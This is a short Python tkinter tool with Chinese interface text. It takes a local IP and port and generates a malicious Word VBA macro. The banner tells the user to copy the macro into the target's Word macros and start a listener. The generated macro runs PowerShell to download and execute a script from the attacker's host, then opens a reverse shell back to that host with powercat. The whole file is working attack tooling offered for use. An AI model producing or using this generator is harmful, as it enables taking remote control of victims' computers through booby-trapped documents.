from tkinter import*
from tkinter import messagebox




def start():
    lhost = en.get()
    lport = en_1.get()
    ban = '请复制一下到对方的word宏中(不会请访问www.baidu.com（滑稽）)'
    ban += '并开启相应的监听: \n'
    cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://" + lhost + ":8080/dol');powercat -c " + lhost + ' -p ' +lport + ' -e cmd'
    word = "Sub shell() \n"
    word += "Dim Notep As Object \n"
    word += 'Set Notep = CreateObject("wscript.Shell") \n'
    word += 'Notep.Run ' + '"' + cmd + '"' + ' \n'
    word += 'Set Notep = Nothing \n'
    word += 'End Sub \n'
    ban = ban + word
    messagebox.showinfo("word",ban)
    print(ban)

def stop():
    pass


#---------------------------------------------------
tk = Tk()
tk.title('word')
tk.geometry('300x160+420+200')
#----------------------------------------------------
en = Entry(tk)
en.place(x=70,y=20)
en_1 = Entry(tk)
en_1.place(x=70,y=60)
#--------------------------text------------------
w= Label(tk,text='本机IP:',fg="red")
w.place(x=20,y=20)
w_2= Label(tk,text='端口:',fg="red")
w_2.place(x=20,y=60)
#------------------------start or stop----------------
b = Button(tk, text ="生成", command=start)
b.place(x=20,y=90)
b_2 = Button(tk, text ="帮助", command=stop)
b_2.place(x=150,y=90)
tk.mainloop()
